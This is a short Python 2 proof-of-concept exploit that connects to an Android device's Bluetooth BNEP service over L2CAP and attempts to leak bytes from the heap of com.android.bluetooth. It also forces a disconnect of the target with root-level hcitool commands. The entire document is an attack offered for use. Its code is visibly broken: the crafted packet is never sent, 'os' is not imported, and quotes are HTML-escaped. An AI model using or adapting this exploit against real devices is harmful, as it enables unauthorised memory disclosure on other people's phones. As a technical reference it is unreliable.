import sys
import struct
 
import bluetooth
 
BNEP_PSM = 15
BNEP_FRAME_COMPRESSED_ETHERNET = 0x02
LEAK_ATTEMPTS = 20
 
def leak(src_bdaddr, dst):
 
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.settimeout(5)
    bnep.bind((src_bdaddr, 0))
    print &#039;Connecting to BNEP...&#039;
    bnep.connect((dst, BNEP_PSM))
    bnep.settimeout(1)
    print &#039;Leaking bytes from the heap of com.android.bluetooth...&#039;
 
    for i in range(LEAK_ATTEMPTS):
        # A byte from the heap at (p + controlled_length) will be leaked
        # if it&#039;s greater than BNEP_FILTER_MULTI_ADDR_RESPONSE_MSG (0x06).
        # This BNEP packet can be seen in Wireshark with the following info:
        # The response sent by bnep_send_command_not_understood() contains 3 bytes:
        # 0x01 (BNEP_FRAME_CONTROL) + 0x00 (BNEP_CONTROL_COMMAND_NOT_UNDERSTOOD) + leaked byte
 
        # 0x82 & 0x80 == 0x80 -> Extension flag = True. 0x82 & 0x7f == 0x2 -> type
 
        # 0x80 -> ext -> we need to pass this check: !(ext & 0x7f)
        ext = 0x80
 
        # i -> length (the &#039;p&#039; pointer is advanced by this length)
 
        try:
            data = bnep.recv(3)
        except bluetooth.btcommon.BluetoothError:
            data = &#039;&#039;
 
        if data:
            print &#039;heap[p + 0x%02x] = 0x%02x&#039; % (i, ord(data[-1]))
        else:
            print &#039;heap[p + 0x%02x] <= 6&#039; % (i)
 
    print &#039;Closing connection.&#039;
    bnep.close()
 
 
def main(src_bdaddr, dst):
    os.system(&#039;hciconfig %s sspmode 0&#039; % (src_bdaddr,))
    os.system(&#039;hcitool dc %s&#039; % (dst,))
 
    leak(src_bdaddr, dst)
 
 
if __name__ == &#039;__main__&#039;:
    if len(sys.argv) < 3:
        print(&#039;Usage: python bnep01.py <src-bdaddr> <dst-bdaddr>&#039;)
    else:
        if os.getuid():
            print &#039;Error: This script must be run as root.&#039;
        else:
            main(sys.argv[1], sys.argv[2])

